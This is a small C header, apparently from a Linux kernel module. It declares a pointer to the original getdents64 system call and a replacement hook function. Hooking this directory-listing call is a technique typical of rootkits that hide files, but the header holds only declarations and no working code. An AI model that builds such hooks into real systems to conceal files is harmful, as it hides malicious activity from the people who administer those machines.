#ifndef GETEDENTS64_H_ /* Include guard */
#define GETEDENTS64_H_

#include "linux/linkage.h"
#include "linux/ptrace.h"

extern asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
extern asmlinkage long getdents64_hook(struct pt_regs *regs);

#endif // GETEDENTS64_H_
